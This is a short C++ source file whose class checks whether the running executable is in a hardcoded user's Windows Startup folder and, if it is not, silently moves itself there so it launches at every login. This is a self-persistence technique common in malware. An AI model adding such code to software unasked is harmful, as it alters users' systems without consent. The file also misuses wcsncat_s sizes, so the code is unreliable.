#pragma once

#include "StartupFile.h"

CheckStartupFile::CheckStartupFile(){

	CheckStartupFile::bCheckStartupFile();

}

bool CheckStartupFile::bCheckStartupFile() {

	const wchar_t* lpStartupFileLocation = L"C:\\Users\\noctu\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	wchar_t lpCurrentFilePath[MAX_PATH] = { 0 };
	wchar_t lpFileName[MAX_PATH];
	GetModuleFileNameW(NULL, lpCurrentFilePath, MAX_PATH);
	StrCpyW(lpFileName, lpCurrentFilePath);
	PathCchRemoveFileSpec(lpCurrentFilePath, wcslen(lpCurrentFilePath));

	if (wcsncmp(lpStartupFileLocation, lpCurrentFilePath, wcslen(lpStartupFileLocation)) != 0) {
		bMoveExeToStartUpFile(lpStartupFileLocation, lpFileName);
	}

	return true;
}


bool CheckStartupFile::bMoveExeToStartUpFile(const wchar_t* lpStartupFileLocation, wchar_t* lpCurrentFilePath) {

	wchar_t lpFileName[MAX_PATH];
	wchar_t lpFinalFilePath[1000] = { 0 };

	StrCpyW(lpFileName, lpCurrentFilePath);
	PathStripPathW(lpFileName);

	wcsncat_s(lpFinalFilePath, lpStartupFileLocation, sizeof(lpFinalFilePath));
	wcsncat_s(lpFinalFilePath, L"\\", sizeof(lpFinalFilePath));
	wcsncat_s(lpFinalFilePath, lpFileName, sizeof(lpFinalFilePath));

	MoveFileExW(lpCurrentFilePath, lpFinalFilePath, NULL);

	return TRUE;
}


